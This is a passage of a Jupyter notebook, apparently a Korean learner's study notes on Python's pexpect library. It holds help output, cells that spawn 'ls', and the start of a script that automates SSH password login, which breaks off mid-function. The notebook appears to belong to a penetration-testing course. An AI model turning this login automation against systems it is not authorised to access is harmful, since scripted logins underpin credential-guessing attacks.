        " |      This is a wrapper around os.read(). It uses select.select() to\n",
        " |      implement the timeout.\n",
        " |  \n",
        " |  readline(self, size=-1)\n",
        " |      This reads and returns one entire line. The newline at the end of\n",
        " |      line is returned as part of the string, unless the file ends without a\n",
        " |      newline. An empty string is returned if EOF is encountered immediately.\n",
        " |      This looks for a newline as a CR/LF pair (\\r\\n) even on UNIX because\n",
        " |      this is what the pseudotty device returns. So contrary to what you may\n",
        " |      expect you will receive newlines as \\r\\n.\n",
        " |      \n",
        " |      If the size argument is 0 then an empty string is returned. In all\n",
        " |      other cases the size argument is ignored, which is not standard\n",
        " |      behavior for a file-like object.\n",
        " |  \n",
        " |  readlines(self, sizehint=-1)\n",
        " |      This reads until EOF using readline() and returns a list containing\n",
        " |      the lines thus read. The optional 'sizehint' argument is ignored.\n",
        " |      Remember, because this reads until EOF that means the child\n",
        " |      process should have closed its stdout. If you run this method on\n",
        " |      a child that is still running with its stdout open then this\n",
        " |      method will block until it timesout.\n",
        " |  \n",
        " |  send(self, s)\n",
        " |      Sends string ``s`` to the child process, returning the number of\n",
        " |      bytes written. If a logfile is specified, a copy is written to that\n",
        " |      log.\n",
        " |  \n",
        " |  sendcontrol(self, char)\n",
        " |      Helper method that wraps send() with mnemonic access for sending control\n",
        " |      character to the child (such as Ctrl-C or Ctrl-D).  For example, to send\n",
        " |      Ctrl-G (ASCII 7, bell, '\u0007')::\n",
        " |      \n",
        " |          child.sendcontrol('g')\n",
        " |      \n",
        " |      See also, sendintr() and sendeof().\n",
        " |  \n",
        " |  sendeof(self)\n",
        " |      This sends an EOF to the child. This sends a character which causes\n",
        " |      the pending parent output buffer to be sent to the waiting child\n",
        " |      program without waiting for end-of-line. If it is the first character\n",
        " |      of the line, the read() in the user program returns 0, which signifies\n",
        " |      end-of-file. This means to work as expected a sendeof() has to be\n",
        " |      called at the beginning of a line. This method does not send a newline.\n",
        " |      It is the responsibility of the caller to ensure the eof is sent at the\n",
        " |      beginning of a line.\n",
        " |  \n",
        " |  sendintr(self)\n",
        " |      This sends a SIGINT to the child. It does not require\n",
        " |      the SIGINT to be the first character on a line.\n",
        " |  \n",
        " |  sendline(self, s='')\n",
        " |      Wraps send(), sending string ``s`` to child process, with os.linesep\n",
        " |      automatically appended. Returns number of bytes written.\n",
        " |  \n",
        " |  setecho(self, state)\n",
        " |      This sets the terminal echo mode on or off. Note that anything the\n",
        " |      child sent before the echo will be lost, so you should be sure that\n",
        " |      your input buffer is empty before you call setecho(). For example, the\n",
        " |      following will work as expected::\n",
        " |      \n",
        " |          p = pexpect.spawn('cat') # Echo is on by default.\n",
        " |          p.sendline('1234') # We expect see this twice from the child...\n",
        " |          p.expect(['1234']) # ... once from the tty echo...\n",
        " |          p.expect(['1234']) # ... and again from cat itself.\n",
        " |          p.setecho(False) # Turn off tty echo\n",
        " |          p.sendline('abcd') # We will set this only once (echoed by cat).\n",
        " |          p.sendline('wxyz') # We will set this only once (echoed by cat)\n",
        " |          p.expect(['abcd'])\n",
        " |          p.expect(['wxyz'])\n",
        " |      \n",
        " |      The following WILL NOT WORK because the lines sent before the setecho\n",
        " |      will be lost::\n",
        " |      \n",
        " |          p = pexpect.spawn('cat')\n",
        " |          p.sendline('1234')\n",
        " |          p.setecho(False) # Turn off tty echo\n",
        " |          p.sendline('abcd') # We will set this only once (echoed by cat).\n",
        " |          p.sendline('wxyz') # We will set this only once (echoed by cat)\n",
        " |          p.expect(['1234'])\n",
        " |          p.expect(['1234'])\n",
        " |          p.expect(['abcd'])\n",
        " |          p.expect(['wxyz'])\n",
        " |  \n",
        " |  setlog(self, fileobject)\n",
        " |      This method is no longer supported or allowed.\n",
        " |  \n",
        " |  setmaxread(self, maxread)\n",
        " |      This method is no longer supported or allowed. I don't like getters\n",
        " |      and setters without a good reason.\n",
        " |  \n",
        " |  setwinsize(self, rows, cols)\n",
        " |      This sets the terminal window size of the child tty. This will cause\n",
        " |      a SIGWINCH signal to be sent to the child. This does not change the\n",
        " |      physical window size. It changes the size reported to TTY-aware\n",
        " |      applications like vi or curses -- applications that respond to the\n",
        " |      SIGWINCH signal.\n",
        " |  \n",
        " |  terminate(self, force=False)\n",
        " |      This forces a child process to terminate. It starts nicely with\n",
        " |      SIGHUP and SIGINT. If \"force\" is True then moves onto SIGKILL. This\n",
        " |      returns True if the child was terminated. This returns False if the\n",
        " |      child could not be terminated.\n",
        " |  \n",
        " |  wait(self)\n",
        " |      This waits until the child exits. This is a blocking call. This will\n",
        " |      not read any data from the child, so this will block forever if the\n",
        " |      child has unread output and has terminated. In other words, the child\n",
        " |      may have printed output then called exit(), but, the child is\n",
        " |      technically still alive until its output is read by the parent.\n",
        " |  \n",
        " |  waitnoecho(self, timeout=-1)\n",
        " |      This waits until the terminal ECHO flag is set False. This returns\n",
        " |      True if the echo mode is off. This returns False if the ECHO flag was\n",
        " |      not set False before the timeout. This can be used to detect when the\n",
        " |      child is waiting for a password. Usually a child application will turn\n",
        " |      off echo mode when it is waiting for the user to enter a password. For\n",
        " |      example, instead of expecting the \"password:\" prompt you can wait for\n",
        " |      the child to set ECHO off::\n",
        " |      \n",
        " |          p = pexpect.spawn('ssh user@example.com')\n",
        " |          p.waitnoecho()\n",
        " |          p.sendline(mypassword)\n",
        " |      \n",
        " |      If timeout==-1 then this method will use the value in self.timeout.\n",
        " |      If timeout==None then this method to block until ECHO flag is False.\n",
        " |  \n",
        " |  write(self, s)\n",
        " |      This is similar to send() except that there is no return value.\n",
        " |  \n",
        " |  writelines(self, sequence)\n",
        " |      This calls write() for each element in the sequence. The sequence\n",
        " |      can be any iterable object producing strings, typically a list of\n",
        " |      strings. This does not add line separators. There is no return value.\n",
        " |  \n",
        " |  ----------------------------------------------------------------------\n",
        " |  Data descriptors defined here:\n",
        " |  \n",
        " |  __dict__\n",
        " |      dictionary for instance variables (if defined)\n",
        " |  \n",
        " |  __weakref__\n",
        " |      list of weak references to the object (if defined)\n",
        " |  \n",
        " |  ----------------------------------------------------------------------\n",
        " |  Data and other attributes defined here:\n",
        " |  \n",
        " |  allowed_string_types = (<type 'basestring'>,)\n",
        " |  \n",
        " |  encoding = None\n",
        " |  \n",
        " |  linesep = '\\n'\n",
        " |  \n",
        " |  string_type = <type 'str'>\n",
        " |      str(object='') -> string\n",
        " |      \n",
        " |      Return a nice string representation of the object.\n",
        " |      If the argument is a string, the return value is the same object.\n",
        " |  \n",
        " |  write_to_stdout = <built-in method write of file object>\n",
        " |      write(str) -> None.  Write string str to file.\n",
        " |      \n",
        " |      Note that due to buffering, flush() or close() may be needed before\n",
        " |      the file on disk reflects the data written.\n",
        "\n"
       ]
      }
     ],
     "prompt_number": 11
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "p = pexpect.spawn('ls')\n",
      "p.expect(pexpect.EOF)\n",
      "print(p.before)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "IPython_Notebook_Revolution.ipynb           \u001b[1m\u001b[34mch05\u001b[m\u001b[m\r\n",
        "Part 4 - Markdown Cells.ipynb               \u001b[1m\u001b[34mch06\u001b[m\u001b[m\r\n",
        "Part 5 - Rich Display System.ipynb          \u001b[1m\u001b[34mch07\u001b[m\u001b[m\r\n",
        "Study_list.ipynb                            \u001b[1m\u001b[34mevil\u001b[m\u001b[m\r\n",
        "Untitled0.ipynb                             \u001b[1m\u001b[34mimages\u001b[m\u001b[m\r\n",
        "Untitled1.ipynb                             main_test.py\r\n",
        "Untitled1.slides.html                       main_test.pyc\r\n",
        "Untitled2.ipynb                             main_test2.py\r\n",
        "\u001b[1m\u001b[34mch01\u001b[m\u001b[m                                        main_test2.pyc\r\n",
        "ch01_Introduction.ipynb                     python_challenge01-10.ipynb\r\n",
        "ch01_Introduction.slides.html               python_challenge01-10_slide.ipynb\r\n",
        "\u001b[1m\u001b[34mch02\u001b[m\u001b[m                                        \u001b[1m\u001b[31mpython_challenge01-10_slide.ipynb.zip\u001b[m\u001b[m\r\n",
        "ch02_Penetration_test.ipynb                 python_challenge01-10_slide.slides.html\r\n",
        "\u001b[1m\u001b[34mch03\u001b[m\u001b[m                                        \u001b[1m\u001b[31mpython_challenge01-10_slide.slides.html.zip\u001b[m\u001b[m\r\n",
        "\u001b[1m\u001b[34mch04\u001b[m\u001b[m                                        \u001b[1m\u001b[34mtmp\u001b[m\u001b[m\r\n",
        "\n"
       ]
      }
     ],
     "prompt_number": 12
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "------\n",
      "\n",
      "#### p.before, p.after \ube44\uad50"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "p.before"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 22,
       "text": [
        "'IPython_Notebook_Revolution.ipynb           \\x1b[1m\\x1b[34mch05\\x1b[m\\x1b[m\\r\\nPart 4 - Markdown Cells.ipynb               \\x1b[1m\\x1b[34mch06\\x1b[m\\x1b[m\\r\\nPart 5 - Rich Display System.ipynb          \\x1b[1m\\x1b[34mch07\\x1b[m\\x1b[m\\r\\nStudy_list.ipynb                            \\x1b[1m\\x1b[34mevil\\x1b[m\\x1b[m\\r\\nUntitled0.ipynb                             \\x1b[1m\\x1b[34mimages\\x1b[m\\x1b[m\\r\\nUntitled1.ipynb                             main_test.py\\r\\nUntitled1.slides.html                       main_test.pyc\\r\\nUntitled2.ipynb                             main_test2.py\\r\\n\\x1b[1m\\x1b[34mch01\\x1b[m\\x1b[m                                        main_test2.pyc\\r\\nch01_Introduction.ipynb                     python_challenge01-10.ipynb\\r\\nch01_Introduction.slides.html               python_challenge01-10_slide.ipynb\\r\\n\\x1b[1m\\x1b[34mch02\\x1b[m\\x1b[m                                        \\x1b[1m\\x1b[31mpython_challenge01-10_slide.ipynb.zip\\x1b[m\\x1b[m\\r\\nch02_Penetration_test.ipynb                 python_challenge01-10_slide.slides.html\\r\\n\\x1b[1m\\x1b[34mch03\\x1b[m\\x1b[m                                        \\x1b[1m\\x1b[31mpython_challenge01-10_slide.slides.html.zip\\x1b[m\\x1b[m\\r\\n\\x1b[1m\\x1b[34mch04\\x1b[m\\x1b[m                                        \\x1b[1m\\x1b[34mtmp\\x1b[m\\x1b[m\\r\\n'"
       ]
      }
     ],
     "prompt_number": 22
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "p.after"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 21,
       "text": [
        "pexpect.EOF"
       ]
      }
     ],
     "prompt_number": 21
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "----"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "help(pexpect.EOF)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "Help on class EOF in module pexpect:\n",
        "\n",
        "class EOF(ExceptionPexpect)\n",
        " |  Raised when EOF is read from a child.\n",
        " |  This usually means the child has exited.\n",
        " |  \n",
        " |  Method resolution order:\n",
        " |      EOF\n",
        " |      ExceptionPexpect\n",
        " |      exceptions.Exception\n",
        " |      exceptions.BaseException\n",
        " |      __builtin__.object\n",
        " |  \n",
        " |  Methods inherited from ExceptionPexpect:\n",
        " |  \n",
        " |  __init__(self, value)\n",
        " |  \n",
        " |  __str__(self)\n",
        " |  \n",
        " |  get_trace(self)\n",
        " |      This returns an abbreviated stack trace with lines that only concern\n",
        " |      the caller. In other words, the stack trace inside the Pexpect module\n",
        " |      is not included.\n",
        " |  \n",
        " |  ----------------------------------------------------------------------\n",
        " |  Data descriptors inherited from ExceptionPexpect:\n",
        " |  \n",
        " |  __weakref__\n",
        " |      list of weak references to the object (if defined)\n",
        " |  \n",
        " |  ----------------------------------------------------------------------\n",
        " |  Data and other attributes inherited from exceptions.Exception:\n",
        " |  \n",
        " |  __new__ = <built-in method __new__ of type object>\n",
        " |      T.__new__(S, ...) -> a new object with type S, a subtype of T\n",
        " |  \n",
        " |  ----------------------------------------------------------------------\n",
        " |  Methods inherited from exceptions.BaseException:\n",
        " |  \n",
        " |  __delattr__(...)\n",
        " |      x.__delattr__('name') <==> del x.name\n",
        " |  \n",
        " |  __getattribute__(...)\n",
        " |      x.__getattribute__('name') <==> x.name\n",
        " |  \n",
        " |  __getitem__(...)\n",
        " |      x.__getitem__(y) <==> x[y]\n",
        " |  \n",
        " |  __getslice__(...)\n",
        " |      x.__getslice__(i, j) <==> x[i:j]\n",
        " |      \n",
        " |      Use of negative indices is not supported.\n",
        " |  \n",
        " |  __reduce__(...)\n",
        " |  \n",
        " |  __repr__(...)\n",
        " |      x.__repr__() <==> repr(x)\n",
        " |  \n",
        " |  __setattr__(...)\n",
        " |      x.__setattr__('name', value) <==> x.name = value\n",
        " |  \n",
        " |  __setstate__(...)\n",
        " |  \n",
        " |  __unicode__(...)\n",
        " |  \n",
        " |  ----------------------------------------------------------------------\n",
        " |  Data descriptors inherited from exceptions.BaseException:\n",
        " |  \n",
        " |  __dict__\n",
        " |  \n",
        " |  args\n",
        " |  \n",
        " |  message\n",
        "\n"
       ]
      }
     ],
     "prompt_number": 18
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "p = pexpect.spawn('/bin/ls')\n",
      "p.expect(pexpect.EOF)\n",
      "print(p.before)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "IPython_Notebook_Revolution.ipynb           \u001b[1m\u001b[34mch05\u001b[m\u001b[m\r\n",
        "Part 4 - Markdown Cells.ipynb               \u001b[1m\u001b[34mch06\u001b[m\u001b[m\r\n",
        "Part 5 - Rich Display System.ipynb          \u001b[1m\u001b[34mch07\u001b[m\u001b[m\r\n",
        "Study_list.ipynb                            \u001b[1m\u001b[34mevil\u001b[m\u001b[m\r\n",
        "Untitled0.ipynb                             \u001b[1m\u001b[34mimages\u001b[m\u001b[m\r\n",
        "Untitled1.ipynb                             main_test.py\r\n",
        "Untitled1.slides.html                       main_test.pyc\r\n",
        "Untitled2.ipynb                             main_test2.py\r\n",
        "\u001b[1m\u001b[34mch01\u001b[m\u001b[m                                        main_test2.pyc\r\n",
        "ch01_Introduction.ipynb                     python_challenge01-10.ipynb\r\n",
        "ch01_Introduction.slides.html               python_challenge01-10_slide.ipynb\r\n",
        "\u001b[1m\u001b[34mch02\u001b[m\u001b[m                                        \u001b[1m\u001b[31mpython_challenge01-10_slide.ipynb.zip\u001b[m\u001b[m\r\n",
        "ch02_Penetration_test.ipynb                 python_challenge01-10_slide.slides.html\r\n",
        "\u001b[1m\u001b[34mch03\u001b[m\u001b[m                                        \u001b[1m\u001b[31mpython_challenge01-10_slide.slides.html.zip\u001b[m\u001b[m\r\n",
        "\u001b[1m\u001b[34mch04\u001b[m\u001b[m                                        \u001b[1m\u001b[34mtmp\u001b[m\u001b[m\r\n",
        "\n"
       ]
      }
     ],
     "prompt_number": 23
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "p = pexpect.spawn('/bin/bash -c \"ls\"')\n",
      "p.expect(pexpect.EOF)\n",
      "print(p.before)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "IPython_Notebook_Revolution.ipynb           \u001b[1m\u001b[34mch05\u001b[m\u001b[m\r\n",
        "Part 4 - Markdown Cells.ipynb               \u001b[1m\u001b[34mch06\u001b[m\u001b[m\r\n",
        "Part 5 - Rich Display System.ipynb          \u001b[1m\u001b[34mch07\u001b[m\u001b[m\r\n",
        "Study_list.ipynb                            \u001b[1m\u001b[34mevil\u001b[m\u001b[m\r\n",
        "Untitled0.ipynb                             \u001b[1m\u001b[34mimages\u001b[m\u001b[m\r\n",
        "Untitled1.ipynb                             main_test.py\r\n",
        "Untitled1.slides.html                       main_test.pyc\r\n",
        "Untitled2.ipynb                             main_test2.py\r\n",
        "\u001b[1m\u001b[34mch01\u001b[m\u001b[m                                        main_test2.pyc\r\n",
        "ch01_Introduction.ipynb                     python_challenge01-10.ipynb\r\n",
        "ch01_Introduction.slides.html               python_challenge01-10_slide.ipynb\r\n",
        "\u001b[1m\u001b[34mch02\u001b[m\u001b[m                                        \u001b[1m\u001b[31mpython_challenge01-10_slide.ipynb.zip\u001b[m\u001b[m\r\n",
        "ch02_Penetration_test.ipynb                 python_challenge01-10_slide.slides.html\r\n",
        "\u001b[1m\u001b[34mch03\u001b[m\u001b[m                                        \u001b[1m\u001b[31mpython_challenge01-10_slide.slides.html.zip\u001b[m\u001b[m\r\n",
        "\u001b[1m\u001b[34mch04\u001b[m\u001b[m                                        \u001b[1m\u001b[34mtmp\u001b[m\u001b[m\r\n",
        "\n"
       ]
      }
     ],
     "prompt_number": 24
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "print(pexpect.run('ls'))"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "IPython_Notebook_Revolution.ipynb           \u001b[1m\u001b[34mch05\u001b[m\u001b[m\r\n",
        "Part 4 - Markdown Cells.ipynb               \u001b[1m\u001b[34mch06\u001b[m\u001b[m\r\n",
        "Part 5 - Rich Display System.ipynb          \u001b[1m\u001b[34mch07\u001b[m\u001b[m\r\n",
        "Study_list.ipynb                            \u001b[1m\u001b[34mevil\u001b[m\u001b[m\r\n",
        "Untitled0.ipynb                             \u001b[1m\u001b[34mimages\u001b[m\u001b[m\r\n",
        "Untitled1.ipynb                             main_test.py\r\n",
        "Untitled1.slides.html                       main_test.pyc\r\n",
        "Untitled2.ipynb                             main_test2.py\r\n",
        "\u001b[1m\u001b[34mch01\u001b[m\u001b[m                                        main_test2.pyc\r\n",
        "ch01_Introduction.ipynb                     python_challenge01-10.ipynb\r\n",
        "ch01_Introduction.slides.html               python_challenge01-10_slide.ipynb\r\n",
        "\u001b[1m\u001b[34mch02\u001b[m\u001b[m                                        \u001b[1m\u001b[31mpython_challenge01-10_slide.ipynb.zip\u001b[m\u001b[m\r\n",
        "ch02_Penetration_test.ipynb                 python_challenge01-10_slide.slides.html\r\n",
        "\u001b[1m\u001b[34mch03\u001b[m\u001b[m                                        \u001b[1m\u001b[31mpython_challenge01-10_slide.slides.html.zip\u001b[m\u001b[m\r\n",
        "\u001b[1m\u001b[34mch04\u001b[m\u001b[m                                        \u001b[1m\u001b[34mtmp\u001b[m\u001b[m\r\n",
        "\n"
       ]
      }
     ],
     "prompt_number": 25
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "PROMPT = ['# ', '>>> ', '> ', '\\$ ']\n",
      "p = pexpect.spawn('/bin/ls')\n",
      "p.expect(PROMPT)\n",
      "print(p.before)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "ename": "EOF",
       "evalue": "End Of File (EOF). Empty string style platform.\n<pexpect.spawn object at 0x10d5b3950>\nversion: 3.2\ncommand: /bin/ls\nargs: ['/bin/ls']\nsearcher: <pexpect.searcher_re object at 0x10d551550>\nbuffer (last 100 chars): ''\nbefore (last 100 chars): 'ides.html.zip\\x1b[m\\x1b[m\\r\\n\\x1b[1m\\x1b[34mch04\\x1b[m\\x1b[m                                        \\x1b[1m\\x1b[34mtmp\\x1b[m\\x1b[m\\r\\n'\nafter: <class 'pexpect.EOF'>\nmatch: None\nmatch_index: None\nexitstatus: 0\nflag_eof: True\npid: 45295\nchild_fd: 80\nclosed: False\ntimeout: 30\ndelimiter: <class 'pexpect.EOF'>\nlogfile: None\nlogfile_read: None\nlogfile_send: None\nmaxread: 2000\nignorecase: False\nsearchwindowsize: None\ndelaybeforesend: 0.05\ndelayafterclose: 0.1\ndelayafterterminate: 0.1",
       "output_type": "pyerr",
       "traceback": [
        "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m\n\u001b[0;31mEOF\u001b[0m                                       Traceback (most recent call last)",
        "\u001b[0;32m<ipython-input-26-8d516d63dd84>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m()\u001b[0m\n\u001b[1;32m      1\u001b[0m \u001b[0mPROMPT\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;34m[\u001b[0m\u001b[0;34m'# '\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m'>>> '\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m'> '\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m'\\$ '\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      2\u001b[0m \u001b[0mp\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mpexpect\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mspawn\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'/bin/ls'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 3\u001b[0;31m \u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mexpect\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mPROMPT\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      4\u001b[0m \u001b[0;32mprint\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mbefore\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
        "\u001b[0;32m/Users/re4lfl0w/Library/Enthought/Canopy_64bit/User/lib/python2.7/site-packages/pexpect/__init__.pyc\u001b[0m in \u001b[0;36mexpect\u001b[0;34m(self, pattern, timeout, searchwindowsize)\u001b[0m\n\u001b[1;32m   1416\u001b[0m         \u001b[0mcompiled_pattern_list\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mcompile_pattern_list\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mpattern\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1417\u001b[0m         return self.expect_list(compiled_pattern_list,\n\u001b[0;32m-> 1418\u001b[0;31m                 timeout, searchwindowsize)\n\u001b[0m\u001b[1;32m   1419\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1420\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0mexpect_list\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mpattern_list\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mtimeout\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;34m-\u001b[0m\u001b[0;36m1\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0msearchwindowsize\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;34m-\u001b[0m\u001b[0;36m1\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
        "\u001b[0;32m/Users/re4lfl0w/Library/Enthought/Canopy_64bit/User/lib/python2.7/site-packages/pexpect/__init__.pyc\u001b[0m in \u001b[0;36mexpect_list\u001b[0;34m(self, pattern_list, timeout, searchwindowsize)\u001b[0m\n\u001b[1;32m   1431\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1432\u001b[0m         return self.expect_loop(searcher_re(pattern_list),\n\u001b[0;32m-> 1433\u001b[0;31m                 timeout, searchwindowsize)\n\u001b[0m\u001b[1;32m   1434\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1435\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0mexpect_exact\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mpattern_list\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mtimeout\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;34m-\u001b[0m\u001b[0;36m1\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0msearchwindowsize\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;34m-\u001b[0m\u001b[0;36m1\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
        "\u001b[0;32m/Users/re4lfl0w/Library/Enthought/Canopy_64bit/User/lib/python2.7/site-packages/pexpect/__init__.pyc\u001b[0m in \u001b[0;36mexpect_loop\u001b[0;34m(self, searcher, timeout, searchwindowsize)\u001b[0m\n\u001b[1;32m   1519\u001b[0m                 \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mmatch\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mNone\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1520\u001b[0m                 \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mmatch_index\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mNone\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 1521\u001b[0;31m                 \u001b[0;32mraise\u001b[0m \u001b[0mEOF\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mstr\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0merr\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;34m+\u001b[0m \u001b[0;34m'\\n'\u001b[0m \u001b[0;34m+\u001b[0m \u001b[0mstr\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   1522\u001b[0m         \u001b[0;32mexcept\u001b[0m \u001b[0mTIMEOUT\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1523\u001b[0m             \u001b[0merr\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0msys\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mexc_info\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;36m1\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
        "\u001b[0;31mEOF\u001b[0m: End Of File (EOF). Empty string style platform.\n<pexpect.spawn object at 0x10d5b3950>\nversion: 3.2\ncommand: /bin/ls\nargs: ['/bin/ls']\nsearcher: <pexpect.searcher_re object at 0x10d551550>\nbuffer (last 100 chars): ''\nbefore (last 100 chars): 'ides.html.zip\\x1b[m\\x1b[m\\r\\n\\x1b[1m\\x1b[34mch04\\x1b[m\\x1b[m                                        \\x1b[1m\\x1b[34mtmp\\x1b[m\\x1b[m\\r\\n'\nafter: <class 'pexpect.EOF'>\nmatch: None\nmatch_index: None\nexitstatus: 0\nflag_eof: True\npid: 45295\nchild_fd: 80\nclosed: False\ntimeout: 30\ndelimiter: <class 'pexpect.EOF'>\nlogfile: None\nlogfile_read: None\nlogfile_send: None\nmaxread: 2000\nignorecase: False\nsearchwindowsize: None\ndelaybeforesend: 0.05\ndelayafterclose: 0.1\ndelayafterterminate: 0.1"
       ]
      }
     ],
     "prompt_number": 26
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "__author__ = 're4lfl0w'\n",
      "# -*- coding: utf-8\n",
      "\n",
      "import pexpect\n",
      "\n",
      "PROMPT = ['# ', '>>> ', '> ', '\\$ ']\n",
      "\n",
      "def send_command(child, cmd):\n",
      "    child.sendline(cmd)\n",
      "    child.expect(PROMPT)\n",
      "    # sendline \ubcf4\ub0b8 \ud6c4 \uacb0\uacfc\uac12 \ucd9c\ub825\ud574\uc918\n",
      "    print child.before\n",
      "\n",
      "def connect(user, host, password):\n",
      "    ssh_newkey = 'Are you sure you want to continue connecting'\n",
      "    connStr = 'ssh ' + user + '@' + host\n",
      "    child = pexpect.spawn(connStr)\n",
      "    ssh_password = '[P|p]assword:'\n",
      "    # child.expect\ub85c child\ub97c \uc2e4\ud589\ud558\uace0 3\uac00\uc9c0 \uac12\uc744 \uae30\ub2e4\ub9b0\ub2e4.\n",
      "    # child.expect \uc5d0 \uc785\ub825\ud55c \uc21c\uc11c\ub300\ub85c return \uac12 \ub3cc\ub824\uc90c\n",
      "    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, ssh_password])\n",
      "\n",
      "    # \uc2dc\uac04\ucd08\uacfc\uac00 \ubc1c\uc0dd\ud558\uba74 0 \ubc18\ud658\n",
      "    if ret == 0:\n",
      "        print '[-] Error Connecting'\n",
      "        return\n",
      "\n",
      "    # ssh_newkey \uba54\uc2dc\uc9c0\ub97c \ubc1b\uc73c\uba74 1 \ubc18\ud658\n",
      "    if ret == 1:\n",
      "        child.sendline('yes')\n",
      "        ret = child.expect([pexpect.TIMEOUT, ssh_password])\n",
      "\n",
      "        # \uc2dc\uac04\ucd08\uacfc\uac00 \ubc1c\uc0dd\ud558\uba74 0 \ubc18\ud658\n",
      "        if ret == 0:\n",
      "            print '[-] Error Connecting'\n",
      "            return\n",
      "\n",
      "    # \uc815\uc0c1\uc801\uc73c\ub85c \uc2e4\ud589\ub418\uba74 ret\uac12\uc73c\ub85c 2\uac00 \ub3cc\uc544\uc634(\uadf8 \uc774\uc720\ub294 child.expect\uc5d0 \ub123\uc740 \uc21c\uc11c)\n",
